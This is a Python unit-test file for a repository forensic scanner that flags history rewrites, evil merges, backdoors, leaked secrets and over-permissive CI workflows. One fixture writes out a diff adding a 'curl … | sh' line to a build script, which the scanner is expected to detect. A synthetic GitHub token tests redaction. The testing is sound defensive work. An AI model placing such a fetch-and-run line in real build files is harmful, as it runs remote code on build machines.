import datetime
import io
import json
import os
import shutil
import stat
import subprocess
import tempfile
import unittest
from contextlib import ExitStack, redirect_stderr, redirect_stdout
from unittest.mock import MagicMock, patch

import scan_repo


COMMIT = "a" * 40
FIRST_PARENT = "b" * 40
SECOND_PARENT = "c" * 40
TREE = "d" * 40
BLOB = "e" * 40
FAKE_TOKEN = "ghp_" + "A" * 25
FIXED_TIME = datetime.datetime(2026, 10, 15, 19, 30, 0, 123456)
CHECKS = (
    "check_history_rewrite", "check_author_impersonation", "check_timestamp_forgery",
    "check_replace_refs", "check_backdoors", "check_secrets", "check_moved_tags",
    "check_evil_merges", "check_workflows",
)
ACTIVITY = (
    "gather_branches", "gather_recent_commits", "gather_recent_authors",
    "gather_workflow_runs", "gather_force_pushes",
)


def commit_record(sha=COMMIT, subject="Merge configuration update"):
    return "\0".join([
        sha, "Example Author", "author@example.invalid", "Example Committer",
        "committer@example.invalid", "2026-10-01T09:00:00+02:00",
        "2026-10-01T10:00:00+02:00", subject,
    ]) + "\0"


class ReportingTests(unittest.TestCase):
    def setUp(self):
        self.report = scan_repo.Report("https://github.com/example/service.git", "unused")

    def test_commit_metadata_is_cached_and_redacted(self):
        metadata = commit_record(subject="Merge update " + FAKE_TOKEN) + commit_record(FIRST_PARENT, "")
        with patch.object(scan_repo, "git", return_value=(0, metadata, "")) as git_mock:
            entries = self.report.add("Test findings")
            entries.append(("REVIEW", self.report.commit_context(COMMIT)))
            entries.append(("SKIP", "Comparison unavailable"))
            entries.append(("ERROR", "Read failed"))
            self.assertIn("(no commit message)", self.report.commit_context(FIRST_PARENT))
            self.assertIn("no author or committer inferred", self.report.commit_context(SECOND_PARENT))
            git_mock.assert_called_once()
        output = self.report.render()
        for expected in (
            "Message: Merge update ghp***", "Author: Example Author",
            "Committer: Example Committer", "committed: 2026-10-01T10:00:00+02:00",
            "https://github.com/example/service/commit/" + COMMIT,
            "1 review item(s), 1 skipped check(s), 1 error(s)",
        ):
            self.assertIn(expected, output)
        self.assertNotIn(FAKE_TOKEN, output)
        self.assertIn("\n             Message:", output)

    def test_repository_links(self):
        for url in (
            "https://github.com/example/service.git", "git@github.com:example/service.git",
            "ssh://git@github.com/example/service.git", "https://github.com/example/service/",
        ):
            with self.subTest(url=url):
                report = scan_repo.Report(url, "unused")
                self.assertEqual(report.web_url, "https://github.com/example/service")
        report = scan_repo.Report("file:///tmp/service.git", "unused")
        with patch.object(scan_repo, "git", return_value=(0, commit_record(), "")):
            self.assertIn("git show --format=fuller " + COMMIT, report.commit_context(COMMIT))

    def test_merge_context_and_incomplete_comparisons(self):
        for returncode, recorded_tree, parents, expected in (
            (0, TREE, [FIRST_PARENT, SECOND_PARENT], "REVIEW"),
            (0, BLOB, [FIRST_PARENT, SECOND_PARENT], "RED"),
            (1, TREE, [FIRST_PARENT, SECOND_PARENT], "SKIP"),
            (129, TREE, [FIRST_PARENT, SECOND_PARENT], "ERROR"),
            (0, TREE, [FIRST_PARENT, SECOND_PARENT, BLOB], "SKIP"),
        ):
            with self.subTest(returncode=returncode, parents=len(parents), expected=expected):
                def fake_git(repo, *args, **kwargs):
                    if args[:2] == ("--no-replace-objects", "log"):
                        return 0, commit_record(), ""
                    if args[0] == "rev-list":
                        return 0, COMMIT + "\n", ""
                    if args[0] == "show":
                        return 0, " ".join(parents), ""
                    if args[0] == "diff":
                        return 0, "pom.xml\n", ""
                    if args[0] == "merge-tree":
                        return returncode, TREE + "\n", ""
                    if args[0] == "rev-parse":
                        return 0, recorded_tree + "\n", ""
                    raise AssertionError(args)

                report = scan_repo.Report(self.report.url, "unused")
                with patch.object(scan_repo, "git", side_effect=fake_git):
                    scan_repo.check_evil_merges("unused", report)
                entries = report.sections[0][1]
                self.assertTrue(any(severity == expected for severity, text in entries))
                if expected != "RED":
                    self.assertFalse(any(severity == "RED" for severity, text in entries))
                output = report.render()
                self.assertIn("Message: Merge configuration update", output)
                self.assertIn("Committer: Example Committer", output)
                self.assertIn("Parents: " + FIRST_PARENT, output)

    def test_initial_git_failures_are_not_clean_checks(self):
        for check_name in CHECKS:
            with self.subTest(check=check_name), patch.object(scan_repo, "git", return_value=(124, "", "timeout")):
                report = scan_repo.Report(self.report.url, "unused")
                args = ("unused", report, 14) if check_name == "check_workflows" else ("unused", report)
                getattr(scan_repo, check_name)(*args)
                entries = report.sections[0][1]
                self.assertTrue(any(severity == "ERROR" for severity, text in entries))
                self.assertFalse(any(severity == "ok" for severity, text in entries))

    def test_secrets_keep_spaced_paths_and_resolve_real_commits(self):
        def fake_git(repo, *args, **kwargs):
            if "--find-object=" + BLOB in args:
                return 0, COMMIT + "\n", ""
            if args[:2] == ("--no-replace-objects", "log"):
                return 0, commit_record(), ""
            if args[0] == "rev-list":
                return 0, BLOB + " config/service settings.txt\n", ""
            if args[:2] == ("cat-file", "-s"):
                return 0, "100\n", ""
            if args[:2] == ("cat-file", "-p"):
                return 0, FAKE_TOKEN + '\npassword="${OTHER_SECRET}"', ""
            raise AssertionError(args)

        with patch.object(scan_repo, "git", side_effect=fake_git) as git_mock:
            scan_repo.check_secrets("unused", self.report)
            self.report.object_context(BLOB)
            lookups = [call for call in git_mock.call_args_list if "--find-object=" + BLOB in call.args]
            self.assertEqual(len(lookups), 1)
        output = self.report.render()
        self.assertIn("github-pat at config/service settings.txt", output)
        self.assertIn("may add or remove this object", output)
        self.assertIn("Message: Merge configuration update", output)
        self.assertIn("Ignored 1 password assignment", output)
        self.assertNotIn("/commit/" + BLOB, output)
        self.assertNotIn(FAKE_TOKEN, output)

    def test_secret_coverage_limits_are_explicit(self):
        for size_result, expected in (((0, "1000001\n", ""), "SKIP"), ((124, "", "timeout"), "ERROR")):
            with self.subTest(expected=expected):
                def fake_git(repo, *args, **kwargs):
                    if args[0] == "rev-list":
                        return 0, BLOB + " large.bin\n", ""
                    return size_result

                report = scan_repo.Report(self.report.url, "unused")
                with patch.object(scan_repo, "git", side_effect=fake_git):
                    scan_repo.check_secrets("unused", report)
                self.assertTrue(any(severity == expected for severity, text in report.sections[0][1]))

    def test_payloads_include_location_and_redacted_context(self):
        def fake_git(repo, *args, **kwargs):
            if args[:2] == ("--no-replace-objects", "log"):
                return 0, commit_record(), ""
            if args[0] == "log":
                return 0, COMMIT + "\n", ""
            if args[0] == "show":
                return 0, "+++ b/ci/build.sh\n@@ -0,0 +7 @@\n+curl https://example.invalid/install | sh # " + FAKE_TOKEN + "\n", ""
            raise AssertionError(args)

        with patch.object(scan_repo, "git", side_effect=fake_git):
            scan_repo.check_backdoors("unused", self.report)
        output = self.report.render()
        self.assertIn("Location: ci/build.sh:7", output)
        self.assertIn("Committer: Example Committer", output)
        self.assertNotIn(FAKE_TOKEN, output)

    def test_workflow_context_and_identity_roles(self):
        def fake_git(repo, *args, **kwargs):
            if args[:2] == ("--no-replace-objects", "log"):
                return 0, commit_record(), ""
            if args[0] == "ls-tree":
                return 0, ".github/workflows/deploy.yml\n", ""
            if args[0] == "log":
                return 0, COMMIT + "\n", ""
            if args[0] == "cat-file":
                return 0, "on: workflow_dispatch\npermissions: write-all\n", ""
            if args[0] == "for-each-ref":
                return 0, COMMIT + "\tmain\n", ""
            raise AssertionError(args)

        with patch.object(scan_repo, "git", side_effect=fake_git):
            scan_repo.check_workflows("unused", self.report, 14)
            scan_repo.gather_branches("unused", self.report)
            scan_repo.gather_recent_commits("unused", self.report, 14)
            scan_repo.gather_recent_authors("unused", self.report, 14)
        output = self.report.render()
        for expected in (
            "Location: .github/workflows/deploy.yml:2 (HEAD)", "Last file-changing commit",
            "Review: Confirm each write/OIDC permission", "Branch: main",
            "author of 1 commit(s); committer of 0 commit(s)",
            "author of 0 commit(s); committer of 1 commit(s)",
        ):
            self.assertIn(expected, output)

    def test_api_activity_context_and_coverage(self):
        cases = (
            (scan_repo.gather_workflow_runs, {"total_count": 2, "workflow_runs": [{
                "created_at": "2026-10-15T10:00:00Z", "name": "Deploy", "event": "workflow_dispatch",
                "conclusion": "success", "triggering_actor": {"login": "operator"},
                "head_sha": COMMIT, "head_branch": "main", "html_url": "https://github.com/example/service/actions/runs/1",
            }]}, "Showing 1 of 2 matching runs"),
            (scan_repo.gather_force_pushes, [{
                "timestamp": "2026-10-15T10:00:00Z", "actor": {"login": "operator"},
                "ref": "refs/heads/main", "before": FIRST_PARENT, "after": COMMIT,
            }], "GitHub account operator force-pushed refs/heads/main"),
        )
        for function, data, expected in cases:
            with self.subTest(function=function.__name__):
                response = MagicMock()
                response.__enter__.return_value.read.return_value = json.dumps(data).encode("utf-8")
                report = scan_repo.Report(self.report.url, "unused")
                with patch.object(scan_repo, "git", return_value=(0, commit_record(), "")), \
                     patch.object(scan_repo, "_github_headers", return_value=({}, False)), \
                     patch.object(scan_repo, "_utcnow", return_value=FIXED_TIME), \
                     patch.object(scan_repo.urllib.request, "urlopen", return_value=response):
                    function(report.url, report, 14)
                output = report.render()
                self.assertIn(expected, output)
                self.assertIn("Committer: Example Committer", output)
                self.assertIn("Coverage:", output)

    @unittest.skipUnless(shutil.which("git"), "Git is required for the local plumbing fixture")
    def test_real_git_metadata_format_and_binary_decoding(self):
        with tempfile.TemporaryDirectory(prefix="forensic-git-test-") as directory:
            def raw_git(*args, data=None):
                return subprocess.run(["git", "-C", directory, *args], input=data,
                                      capture_output=True, check=True).stdout

            raw_git("init", "--bare", "--quiet", "--template=")
            tree = raw_git("mktree", data=b"").decode("ascii").strip()
            parent = ""
            commits = []
            for subject in ("First caf\u00e9 commit", ""):
                payload = ("tree %s\n%sauthor Example Author <author@example.invalid> 0 +0000\n"
                           "committer Example Committer <committer@example.invalid> 3600 +0000\n\n%s\n"
                           % (tree, parent, subject)).encode("utf-8")
                sha = raw_git("hash-object", "-t", "commit", "-w", "--stdin", data=payload).decode("ascii").strip()
                commits.append(sha)
                parent = "parent %s\n" % sha
            raw_git("update-ref", "refs/heads/main", commits[-1])
            blob = raw_git("hash-object", "-w", "--stdin", data=b"binary:\x00\xac\xff").decode("ascii").strip()
            report = scan_repo.Report("file:///fixture", directory)
            self.assertEqual(report.commit_info(commits[0])["subject"], "First caf\u00e9 commit")
            self.assertEqual(report.commit_info(commits[1])["subject"], "(no commit message)")
            self.assertEqual(report.commit_info(commits[0])["committer"], "Example Committer <committer@example.invalid>")
            returncode, content, stderr = scan_repo.git(directory, "cat-file", "-p", blob)
            self.assertEqual(returncode, 0)
            self.assertIn("\ufffd", content)
            self.assertEqual(stderr, "")


class ReportFileTests(unittest.TestCase):
    def test_saved_report_names_content_permissions_and_no_overwrite(self):
        original_directory = os.getcwd()
        with tempfile.TemporaryDirectory(prefix="forensic-file-test-") as directory:
            try:
                os.chdir(directory)
                report = scan_repo.Report("https://github.com/example/service.git", "unused")
                report.add("Test").append(("REVIEW", "Ren\u00e9 found a synthetic token: " + FAKE_TOKEN))
                content = report.render()
                cases = (
                    ("https://github.com/example/service.git", "service"),
                    ("git@github.com:example/auth.git", "auth"),
                    ("ssh://git@github.com/example/service.v2.git", "service.v2"),
                    ("file:///tmp/space%20name.git", "space_name"),
                )
                with patch.object(scan_repo, "_utcnow", return_value=FIXED_TIME):
                    for url, name in cases:
                        with self.subTest(url=url):
                            path = scan_repo.save_report(url, content)
                            self.assertTrue(os.path.samefile(os.path.dirname(path), directory))
                            self.assertEqual(os.path.basename(path), name + ".forensicreport.20261015T193000.123456Z.txt")
                            with open(path, encoding="utf-8") as saved:
                                saved_content = saved.read()
                            self.assertEqual(saved_content, content + "\n")
                            self.assertNotIn(FAKE_TOKEN, saved_content)
                            if os.name == "posix":
                                self.assertEqual(stat.S_IMODE(os.stat(path).st_mode), 0o600)
                            with self.assertRaises(FileExistsError):
                                scan_repo.save_report(url, "must not overwrite")
            finally:
                os.chdir(original_directory)

    def test_main_prints_saves_and_handles_save_failure(self):
        for keep, save_error in ((False, None), (True, None), (False, PermissionError("read-only directory"))):
            with self.subTest(keep=keep, save_error=save_error), ExitStack() as stack:
                for name in CHECKS + ACTIVITY:
                    stack.enter_context(patch.object(scan_repo, name))
                stack.enter_context(patch.object(scan_repo, "clone_from_url", return_value="synthetic-clone"))
                save_mock = stack.enter_context(patch.object(scan_repo, "save_report", return_value="/synthetic/report.txt", side_effect=save_error))
                cleanup = stack.enter_context(patch.object(scan_repo.shutil, "rmtree"))
                args = ["scan_repo.py", "https://github.com/example/service.git"] + (["--keep"] if keep else [])
                stack.enter_context(patch("sys.argv", args))
                stdout, stderr = io.StringIO(), io.StringIO()
                with redirect_stdout(stdout), redirect_stderr(stderr):
                    result = scan_repo.main()
                self.assertEqual(result, 1 if save_error else 0)
                rendered = save_mock.call_args.args[1]
                self.assertTrue(stdout.getvalue().startswith(rendered + "\n"))
                if save_error:
                    self.assertIn("Could not save the report", stderr.getvalue())
                    self.assertNotIn("Report saved to:", stdout.getvalue())
                else:
                    self.assertIn("Report saved to: /synthetic/report.txt", stdout.getvalue())
                if keep:
                    cleanup.assert_not_called()
                else:
                    cleanup.assert_called_once_with("synthetic-clone", ignore_errors=True)


if __name__ == "__main__":
    unittest.main()